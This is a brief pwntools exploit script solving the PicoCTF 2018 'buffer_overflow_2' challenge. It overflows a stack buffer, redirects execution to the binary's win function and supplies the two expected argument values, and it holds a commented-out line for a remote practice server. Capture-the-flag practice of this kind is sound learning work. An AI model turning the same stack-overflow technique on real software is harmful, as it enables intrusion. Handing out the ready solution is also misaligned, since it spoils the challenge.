from pwn import *

context(log_level='debug')

io=process("./PicoCTF_2018_buffer_overflow_2")
#io=remote("node3.buuoj.cn",29898)
elf=ELF("./PicoCTF_2018_buffer_overflow_2")

io.recv()

win=0x80485cb

a1=0xDEADBEEF

a2=0xDEADC0DE

payload=b'A'*(0x6c+0x4)+p32(win)+b'AAAA'+p32(a1)+p32(a2)

io.sendline(payload)

io.interactive()